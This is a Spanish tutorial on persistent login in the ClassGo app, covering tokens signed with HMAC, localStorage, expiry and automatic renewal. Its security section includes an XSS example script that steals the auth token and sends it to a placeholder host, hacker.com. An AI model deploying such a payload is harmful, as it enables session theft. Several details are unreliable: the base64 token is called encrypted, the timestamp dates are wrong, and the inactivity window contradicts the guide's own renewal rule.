# 🔐 Cómo Funciona Mantener la Sesión Logueada

## 🎯 **Pregunta Principal**

**"¿Cómo es que puedo cerrar el navegador, volver a entrar a ClassGo y seguir logueado sin poner mi usuario y contraseña otra vez?"**

---

## 📚 **Respuesta Simple**

### **En 1 frase:**
> El navegador **guarda tu "tarjeta de identificación" (token)** en un almacén llamado localStorage, y cada vez que vuelves, muestra esa tarjeta para entrar sin pedir contraseña de nuevo.

### **Analogía del gimnasio:**

```
🏋️ Gimnasio = ClassGo
🎫 Membresía = Token de autenticación
📦 Casillero = localStorage (almacén del navegador)

DÍA 1:
1. Llegas al gimnasio → "Hola, soy Juan"
2. Recepcionista verifica → "Sí, estás registrado"
3. Te dan una TARJETA DE MEMBRESÍA (token)
4. Guardas la tarjeta en tu CASILLERO (localStorage)
5. Entras al gimnasio ✅

DÍA 2 (sin cerrar sesión):
1. Llegas al gimnasio
2. Muestras tu TARJETA del casillero
3. Recepcionista: "✅ Tarjeta válida, pasa"
4. Entras directo, SIN dar usuario y contraseña ✅

DÍA 30 (tarjeta expirada):
1. Llegas al gimnasio
2. Muestras tu tarjeta
3. Recepcionista: "❌ Esta tarjeta expiró hace días"
4. Debes registrarte de nuevo (login otra vez)
```

---

## 🏗️ **Cómo Funciona Técnicamente**

### **Paso a paso completo:**

```
┌──────────────────────────────────────────────────────────┐
│  PRIMERA VEZ - LOGIN                                     │
└──────────────────────────────────────────────────────────┘

1️⃣ Usuario ingresa:
   Email: admin@classgo.com
   Password: Admin123
      ↓

2️⃣ Frontend envía al servidor:
   POST /api/auth/login
   {
     email: "admin@classgo.com",
     password: "Admin123"
   }
      ↓

3️⃣ Backend verifica en Firebase:
   ✅ Email existe
   ✅ Password correcto
      ↓

4️⃣ Backend CREA TOKEN (tarjeta de identificación):
   const token = createToken({
     email: "admin@classgo.com",
     userId: "abc123",
     role: "administrador"
   });
   
   Token generado:
   "eyJlbWFpbCI6ImFkbWluQGNsYXNzZ28uY29tIiwidXNlcklkIjoiYWJjMTIzIiwicm9sZSI6ImFkbWluaXN0cmFkb3IiLCJpYXQiOjE3MjkzNDY0MDAwMDAsImV4cCI6MTcyOTQzMjgwMDAwMH0.dGhpc2lzc2lnbmF0dXJl"
      ↓

5️⃣ Backend envía respuesta:
   {
     success: true,
     token: "eyJlbWFpbCI6...",
     user: {
       email: "admin@classgo.com",
       role: "administrador"
     }
   }
      ↓

6️⃣ Frontend recibe el token y lo GUARDA:
   localStorage.setItem('authToken', token);
   localStorage.setItem('userEmail', 'admin@classgo.com');
   localStorage.setItem('userRole', 'administrador');
      ↓

7️⃣ Frontend redirige a /home
   window.location.href = '/home';
      ↓

✅ Usuario ya está logueado


┌──────────────────────────────────────────────────────────┐
│  CIERRAS EL NAVEGADOR                                    │
└──────────────────────────────────────────────────────────┘

8️⃣ Cierras Chrome/Firefox/etc.
      ↓

9️⃣ localStorage NO se borra (persiste)
   localStorage sigue teniendo:
   - authToken: "eyJlbWFpbCI6..."
   - userEmail: "admin@classgo.com"
   - userRole: "administrador"


┌──────────────────────────────────────────────────────────┐
│  VUELVES A ENTRAR (sin login)                            │
└──────────────────────────────────────────────────────────┘

🔟 Abres navegador → http://localhost:3000/home
      ↓

1️⃣1️⃣ Navegador carga home.html
      ↓

1️⃣2️⃣ app.js se ejecuta y verifica:
   const token = localStorage.getItem('authToken');
   
   ¿Hay token? → ✅ SÍ
      ↓

1️⃣3️⃣ Frontend intenta cargar datos:
   GET /api/users
   Headers: {
     Authorization: "Bearer eyJlbWFpbCI6..."
   }
      ↓

1️⃣4️⃣ Backend verifica el token:
   const { valid, payload } = verifyToken(token);
   
   ✅ Firma válida (no fue modificado)
   ✅ No expiró (creado hace < 24h)
      ↓

1️⃣5️⃣ Backend responde con datos:
   {
     success: true,
     users: [...]
   }
      ↓

1️⃣6️⃣ Frontend muestra la interfaz:
   ✅ Sigues logueado sin poner contraseña ✅
```

---

## 💾 **¿Qué es localStorage?**

### **Definición:**
> localStorage es un **almacén permanente** en tu navegador donde puedes guardar texto (como tokens, configuraciones, etc.) que NO se borra al cerrar el navegador.

### **Analogía:**
```
📦 localStorage = Disco duro del navegador
   └─ Guarda datos PERMANENTEMENTE
   └─ Solo se borra si:
      • Usuario borra datos del navegador
      • Código hace: localStorage.clear()
      • Cambias de computadora

🗂️ sessionStorage = Memoria RAM del navegador
   └─ Guarda datos TEMPORALMENTE
   └─ Se borra al cerrar la pestaña

🧠 Variables normales = Post-it
   └─ Solo existen mientras el código se ejecuta
   └─ Se borran al recargar la página
```

### **Ejemplo de uso:**

```javascript
// ✅ GUARDAR en localStorage
localStorage.setItem('authToken', 'eyJlbWFpbCI6...');
localStorage.setItem('userName', 'Juan Pérez');
localStorage.setItem('darkMode', 'true');

// ✅ LEER de localStorage
const token = localStorage.getItem('authToken');
console.log(token); // "eyJlbWFpbCI6..."

// ✅ VERIFICAR si existe
if (localStorage.getItem('authToken')) {
    console.log('Usuario logueado');
} else {
    console.log('Usuario NO logueado');
}

// ❌ BORRAR todo (logout)
localStorage.clear();

// ❌ BORRAR solo 1 item
localStorage.removeItem('authToken');
```

---

## 🔑 **¿Qué es el Token?**

### **Definición simple:**
> Es un **texto largo y encriptado** que contiene tu información (email, userId, rol) y una firma para verificar que no fue modificado.

### **Estructura del token:**

```
Token completo:
eyJlbWFpbCI6ImFkbWluQGNsYXNzZ28uY29tIiwidXNlcklkIjoiYWJjMTIzIiwicm9sZSI6ImFkbWluaXN0cmFkb3IiLCJpYXQiOjE3MjkzNDY0MDAwMDAsImV4cCI6MTcyOTQzMjgwMDAwMH0.dGhpc2lzc2lnbmF0dXJl

Dividido en 2 partes:
┌────────────────────────────────────────┬──────────────────┐
│  PAYLOAD (datos codificados)          │  SIGNATURE       │
│  eyJlbWFpbCI6...                       │  dGhpc2lzc2...   │
└────────────────────────────────────────┴──────────────────┘

PAYLOAD decodificado (atob):
{
  "email": "admin@classgo.com",
  "userId": "abc123",
  "role": "administrador",
  "iat": 1729346400000,    // Creado: Oct 19, 2025 12:00 PM
  "exp": 1729432800000     // Expira: Oct 20, 2025 12:00 PM
}

SIGNATURE:
- HMAC SHA256 del payload
- Solo el servidor puede crearla (necesita SECRET_KEY)
- Si alguien modifica el payload, la firma NO coincide
```

### **¿Cómo se genera?**

```javascript
// BACKEND - Crear token
function createToken(userData) {
    // 1. Crear payload
    const payload = {
        email: userData.email,
        userId: userData.userId,
        role: userData.role,
        iat: Date.now(),                // Issued At (creado)
        exp: Date.now() + (24 * 60 * 60 * 1000)  // Expira en 24h
    };
    
    // 2. Convertir a base64
    const payloadBase64 = Buffer.from(JSON.stringify(payload))
        .toString('base64');
    
    // 3. Crear firma HMAC SHA256
    const signature = crypto
        .createHmac('sha256', SECRET_KEY)
        .update(payloadBase64)
        .digest('base64');
    
    // 4. Combinar payload + firma
    const token = `${payloadBase64}.${signature}`;
    
    return token;
}
```

---

## ⏰ **¿Cuándo Expira la Sesión?**

### **Configuración actual:**

```javascript
// En backend/utils/tokenManager.js:
const TOKEN_EXPIRATION = 24 * 60 * 60 * 1000;  // 24 horas
```

### **Línea de tiempo:**

```
📅 OCT 19, 2025 - 12:00 PM
   Login exitoso
   Token creado: exp = Oct 20, 2025 12:00 PM
   ↓

📅 OCT 19, 2025 - 06:00 PM (6 horas después)
   Sigues logueado ✅
   Token válido (quedan 18 horas)
   ↓

📅 OCT 20, 2025 - 10:00 AM (22 horas después)
   Sigues logueado ✅
   Token válido (quedan 2 horas)
   🔄 Backend RENUEVA token automáticamente
   Nuevo token: exp = Oct 21, 2025 10:00 AM
   ↓

📅 OCT 20, 2025 - 02:00 PM (26 horas del original)
   Sigues logueado ✅ (gracias a la renovación)
   ↓

📅 Si NO usas la app por 24h seguidas...
   Token expira ❌
   Próxima petición:
   Backend: "Token expirado"
   Frontend: Logout automático → Redirige a login
```

---

## 🔄 **Renovación Automática del Token**

### **¿Por qué renovar?**

```
❌ SIN renovación:
   Oct 19 12:00 PM → Login
   Oct 20 11:30 AM → Estás usando la app activamente
   Oct 20 12:00 PM → Token expira
   Oct 20 12:01 PM → ❌ Logout forzado (malo para UX)

✅ CON renovación:
   Oct 19 12:00 PM → Login
   Oct 20 10:00 AM → Quedan < 2h, backend RENUEVA
   Oct 20 12:00 PM → Token viejo expiró pero YA tienes uno nuevo
   Oct 20 02:00 PM → ✅ Sigues logueado (bueno para UX)
```

### **¿Cómo funciona la renovación?**

```
Usuario hace cualquier petición
   ↓
GET /api/users
Headers: { Authorization: "Bearer token_viejo" }
   ↓
Backend verifica token:
   ✅ Válido
   ✅ Pero quedan menos de 2 horas (shouldRefresh = true)
   ↓
Backend GENERA NUEVO TOKEN:
   const nuevoToken = refreshToken(payload);
   ↓
Backend ENVÍA en header de respuesta:
   Response Headers:
   X-New-Token: token_nuevo
   ↓
Frontend DETECTA el header:
   const nuevoToken = response.headers.get('X-New-Token');
   if (nuevoToken) {
       localStorage.setItem('authToken', nuevoToken);
   }
   ↓
✅ Token actualizado, usuario NO nota nada
```

### **Código en frontend (api-service.js):**

```javascript
async makeRequest(endpoint, options = {}) {
    // Enviar petición con token viejo
    const response = await fetch(url, {
        headers: {
            'Authorization': `Bearer ${this.token}`
        }
    });
    
    // Verificar si hay token nuevo
    const newToken = response.headers.get('X-New-Token');
    if (newToken) {
        console.log('🔄 Token renovado automáticamente');
        localStorage.setItem('authToken', newToken);  // ⭐ Actualizar
        this.token = newToken;
    }
    
    return await response.json();
}
```

---

## 🚪 **¿Cuándo Se Cierra la Sesión?**

### **3 formas de cerrar sesión:**

#### **1️⃣ Usuario hace LOGOUT manual:**

```javascript
// Botón "Cerrar sesión"
function logout() {
    localStorage.clear();           // Borra token
    window.location.href = '/';     // Redirige a login
}
```

#### **2️⃣ Token EXPIRA (sin uso por 24h):**

```javascript
// Usuario no usa la app por 24h
// Próxima petición:
Backend: "Token expirado"
   ↓
Frontend detecta:
if (data.tokenExpired) {
    console.log('❌ Token expirado');
    localStorage.clear();
    window.location.href = '/';
}
```

#### **3️⃣ Usuario BORRA datos del navegador:**

```
Chrome → Configuración → Privacidad
      → Borrar datos de navegación
      → [✓] Cookies y otros datos del sitio
      → Borrar
         ↓
localStorage se borra ❌
Próxima visita: Debe hacer login de nuevo
```

---

## 🔒 **Seguridad del Token**

### **¿Alguien puede robar mi token?**

**Sí, hay varias formas:**

#### **1. Inspeccionar localStorage:**

```javascript
// Cualquiera con acceso a tu navegador puede:
console.log(localStorage.getItem('authToken'));
```

**Protección:**
- ✅ No dejes tu sesión abierta en computadoras públicas
- ✅ Haz logout al salir
- ✅ Tokens expiran en 24h (daño limitado)

---

#### **2. Intercepción de red (sin HTTPS):**

```
HTTP (sin cifrar):
Usuario → Token viaja en TEXTO PLANO → Servidor
              ↑
         Hacker puede leer

HTTPS (cifrado):
Usuario → Token cifrado → Servidor
              ↑
         Hacker ve: #@$%&*!? (ilegible)
```

**Protección:**
- ✅ Usar HTTPS en producción (obligatorio)
- ❌ HTTP solo para desarrollo local

---

#### **3. XSS (Cross-Site Scripting):**

```javascript
// Atacante inyecta código malicioso:
<script>
  const token = localStorage.getItem('authToken');
  fetch('https://hacker.com/steal', {
    method: 'POST',
    body: token
  });
</script>
```

**Protección:**
- ✅ Validar inputs del usuario
- ✅ Escapar HTML
- ✅ Content Security Policy (CSP)
- ✅ Tokens expiran (daño limitado)

---

### **¿Por qué es seguro el token?**

```
✅ HMAC SHA256 firma:
   - Nadie puede CREAR un token válido sin SECRET_KEY
   - Si modificas el payload, la firma NO coincide

✅ Expiración:
   - Token solo válido 24h
   - Si roban token viejo, expira pronto

✅ Renovación:
   - Usuario activo siempre tiene token fresco
   - No se queda con token viejo vulnerable

✅ Verificación en cada petición:
   - Backend verifica CADA petición
   - Token inválido = rechazo inmediato
```

---

## 🧪 **Pruebas para Entender**

### **Prueba 1: Ver tu token en localStorage**

```javascript
// 1. Haz login en ClassGo
// 2. F12 → Console
console.log(localStorage.getItem('authToken'));

// Decodificar payload:
const token = localStorage.getItem('authToken');
const [payload, signature] = token.split('.');
const decoded = JSON.parse(atob(payload));
console.log(decoded);

/*
{
  email: "admin@classgo.com",
  userId: "abc123",
  role: "administrador",
  iat: 1729346400000,
  exp: 1729432800000
}
*/

// Ver cuándo expira:
console.log('Expira:', new Date(decoded.exp));
// Expira: Sat Oct 20 2025 12:00:00
```

---

### **Prueba 2: Cerrar navegador y volver**

```
1. Login en ClassGo
2. Ve a /home (panel admin)
3. Cierra COMPLETAMENTE el navegador
4. Abre navegador de nuevo
5. Ve directo a http://localhost:3000/home
6. ✅ Deberías seguir logueado sin pedir contraseña
```

---

### **Prueba 3: Token expirado**

```javascript
// 1. Modifica tokenManager.js temporalmente:
const TOKEN_EXPIRATION = 10 * 1000; // 10 segundos

// 2. Reinicia backend:
npm start

// 3. Haz login
// 4. Espera 15 segundos
// 5. Intenta cargar /home
// 6. ✅ Debe redirigir a login (token expirado)

// 7. Revertir cambio:
const TOKEN_EXPIRATION = 24 * 60 * 60 * 1000; // 24 horas
```

---

### **Prueba 4: Renovación automática**

```javascript
// 1. Modifica tokenManager.js temporalmente:
const REFRESH_THRESHOLD = 23 * 60 * 60 * 1000; // Renovar si < 23h

// 2. Reinicia backend
// 3. Haz login
// 4. Haz cualquier petición (crear usuario, etc.)
// 5. F12 → Network → Busca header "X-New-Token"
// 6. ✅ Debe aparecer en respuesta
// 7. Console muestra: "🔄 Token renovado automáticamente"
```

---

### **Prueba 5: Borrar localStorage manualmente**

```javascript
// 1. Estando logueado en /home
// 2. F12 → Console:
localStorage.clear();

// 3. Intenta recargar página (F5)
// 4. ✅ Debe redirigir a login
```

---

## 📊 **Comparación: sessionStorage vs localStorage**

| Característica | sessionStorage | localStorage |
|----------------|----------------|--------------|
| **Duración** | Solo mientras está abierta la pestaña | Permanente (hasta borrar) |
| **Cierre de pestaña** | ❌ Se borra | ✅ Se mantiene |
| **Cierre de navegador** | ❌ Se borra | ✅ Se mantiene |
| **Compartido entre pestañas** | ❌ No | ✅ Sí |
| **Ideal para** | Datos temporales de una sesión | Autenticación, configuraciones |

### **Ejemplo:**

```javascript
// ❌ Si usaras sessionStorage:
sessionStorage.setItem('authToken', token);
// Cierras pestaña → Token se borra → Debes hacer login de nuevo

// ✅ Con localStorage:
localStorage.setItem('authToken', token);
// Cierras pestaña → Token se mantiene → Sigues logueado ✅
```

---

## 🎓 **Preguntas Frecuentes**

### **1. ¿Por qué puedo cerrar el navegador y seguir logueado?**
Porque el token se guarda en **localStorage**, que es permanente y no se borra al cerrar el navegador.

---

### **2. ¿Cuánto tiempo dura mi sesión?**
**24 horas** desde el último uso. Si usas la app activamente, se renueva automáticamente cada vez que quedan menos de 2 horas.

---

### **3. ¿Qué pasa si no uso ClassGo por 3 días?**
El token expira a las 24 horas. La próxima vez que entres, te redirigirá al login automáticamente.

---

### **4. ¿Puedo estar logueado en 2 navegadores al mismo tiempo?**
**No**, porque cada navegador tiene su propio localStorage:
- Chrome → Token guardado en Chrome
- Firefox → No tiene token → Debe hacer login

---

### **5. ¿Puedo estar logueado en 2 pestañas del mismo navegador?**
**Sí**, porque comparten el mismo localStorage:
- Pestaña 1 → Login → Guarda token en localStorage
- Pestaña 2 → Lee el mismo token de localStorage → Logueado ✅

---

### **6. ¿Alguien puede robar mi token?**
Sí, si:
- Tienen acceso físico a tu computadora
- Hay un ataque XSS (código malicioso inyectado)
- Usas HTTP sin cifrar (en producción, usa HTTPS)

Pero el daño es limitado porque **el token expira en 24h**.

---

### **7. ¿Qué pasa si borro cookies?**
**Nada**, porque el token NO está en cookies, está en **localStorage**.

Solo se borra si:
- Borras "Cookies y otros datos del sitio" (incluye localStorage)
- Haces `localStorage.clear()` en código

---

### **8. ¿Por qué no usar cookies en vez de localStorage?**

| Aspecto | Cookies | localStorage |
|---------|---------|--------------|
| Tamaño | 4 KB máx | 5-10 MB |
| Se envían en cada petición | Sí (gasto de red) | No (solo cuando lo pides) |
| Accesibles por código | Sí | Sí |
| Expiración automática | Sí (configurable) | No (manual) |
| Seguridad | httpOnly, secure | Solo código |

**Elegimos localStorage** porque:
- ✅ Más espacio (tokens pueden ser grandes)
- ✅ No se envía automáticamente (control total)
- ✅ Simple de usar con JavaScript

---

### **9. ¿Cómo sabe el backend quién soy?**

```
Frontend envía:
GET /api/users
Headers: {
  Authorization: "Bearer eyJlbWFpbCI6..."
}
   ↓
Backend decodifica token:
{
  email: "admin@classgo.com",
  userId: "abc123",
  role: "administrador"
}
   ↓
Backend sabe:
- ✅ Email: admin@classgo.com
- ✅ ID: abc123
- ✅ Rol: administrador
   ↓
Responde con datos personalizados para ese usuario
```

---

### **10. ¿Puedo cambiar el tiempo de expiración?**

**Sí**, edita `backend/utils/tokenManager.js`:

```javascript
// Para 7 días:
const TOKEN_EXPIRATION = 7 * 24 * 60 * 60 * 1000;

// Para 1 hora:
const TOKEN_EXPIRATION = 60 * 60 * 1000;

// Para 30 días:
const TOKEN_EXPIRATION = 30 * 24 * 60 * 60 * 1000;
```

---

## 🎯 **Resumen Visual Completo**

```
┌─────────────────────────────────────────────────────────────┐
│              SESIÓN PERSISTENTE - FLUJO COMPLETO            │
└─────────────────────────────────────────────────────────────┘

📅 DÍA 1 - 12:00 PM
   │
   ├─ Usuario: Login (email + password)
   ├─ Backend: Verifica en Firebase ✅
   ├─ Backend: Crea TOKEN (válido 24h)
   ├─ Frontend: Guarda en localStorage
   └─ ✅ Usuario logueado
   │
   └─ 🚪 Cierra navegador
      └─ localStorage NO se borra (persiste)

📅 DÍA 1 - 06:00 PM
   │
   ├─ Usuario: Abre navegador → http://localhost:3000/home
   ├─ Frontend: Lee token de localStorage
   ├─ Frontend: GET /api/users + token
   ├─ Backend: Verifica token ✅
   ├─ Backend: Responde con datos
   └─ ✅ Usuario sigue logueado SIN pedir contraseña

📅 DÍA 2 - 10:00 AM (22h después del login)
   │
   ├─ Frontend: GET /api/stats + token
   ├─ Backend: Verifica token ✅
   ├─ Backend: Quedan < 2h → RENUEVA token
   ├─ Backend: Envía header X-New-Token
   ├─ Frontend: Actualiza localStorage
   └─ ✅ Token renovado (ahora válido hasta Oct 3 10:00 AM)

📅 DÍA 2 - 02:00 PM
   │
   └─ ✅ Usuario sigue logueado (gracias a renovación)

📅 DÍA 5 (sin usar la app por 3 días)
   │
   ├─ Usuario: Abre http://localhost:3000/home
   ├─ Frontend: GET /api/users + token
   ├─ Backend: Verifica token ❌ EXPIRADO
   ├─ Backend: { tokenExpired: true }
   ├─ Frontend: localStorage.clear()
   ├─ Frontend: Redirige a /
   └─ ❌ Usuario debe hacer login de nuevo
```

---

## 📝 **Resumen en 3 Puntos**

1. **¿Cómo se mantiene la sesión?**
   > El token se guarda en localStorage, que es permanente y no se borra al cerrar el navegador

2. **¿Cuánto dura?**
   > 24 horas, pero se renueva automáticamente si usas la app activamente

3. **¿Cuándo se cierra?**
   > - Usuario hace logout manual
   > - Token expira (sin uso por 24h)
   > - Usuario borra datos del navegador

---

**¡Ahora entiendes perfectamente cómo funciona mantener la sesión logueada!** 🎉

El secreto está en **localStorage** (almacén permanente) + **token con expiración** + **renovación automática** = Sesión persistente y segura. 🔐
